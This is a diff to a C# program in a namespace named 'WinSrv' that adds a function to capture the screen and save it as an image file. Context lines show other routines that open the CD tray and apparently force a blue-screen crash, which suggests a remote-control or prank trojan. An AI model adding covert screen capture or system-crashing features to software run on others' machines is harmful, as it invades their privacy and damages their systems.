@@ -1,6 +1,8 @@
 ﻿using System;
 using System.Collections.Generic;
 using System.Diagnostics;
+using System.Drawing;
+using System.Drawing.Imaging;
 using System.IO;
 using System.Linq;
 using System.Runtime.InteropServices;
@@ -49,6 +51,36 @@ namespace WinSrv
             return mciSendString("set cdaudio door open", null, 0, 0);
         }
 
+        public static void doScreenshot()
+        {
+            try
+            {
+                //Creating a new Bitmap object
+                int screenWidth = Screen.PrimaryScreen.Bounds.Width;
+                int screenHeight = Screen.PrimaryScreen.Bounds.Height;
+                Bitmap captureBitmap = new Bitmap(screenWidth, screenHeight, PixelFormat.Format32bppArgb);
+                //Bitmap captureBitmap = new Bitmap(int width, int height, PixelFormat);
+                //Creating a Rectangle object which will  
+                //capture our Current Screen
+                Rectangle captureRectangle = Screen.AllScreens[0].Bounds;
+                //Creating a New Graphics Object
+                Graphics captureGraphics = Graphics.FromImage(captureBitmap);
+                //Copying Image from The Screen
+                captureGraphics.CopyFromScreen(captureRectangle.Left, captureRectangle.Top, 0, 0, captureRectangle.Size);
+                //Saving the Image File (I am here Saving it in My E drive).
+
+                string workingDir = System.IO.Path.GetDirectoryName(System.Reflection.Assembly.GetExecutingAssembly().Location) + @"\src.jpg";
+
+                captureBitmap.Save(workingDir, ImageFormat.Jpeg);
+                //Displaying the Successfull Result
+                Console.WriteLine("Screen Captured");
+            }
+            catch (Exception ex)
+            {
+                Console.WriteLine(ex.Message);
+            }
+        }
+        
         public static void makeBSOD()
         {
             System.Diagnostics.Process process = new System.Diagnostics.Process();
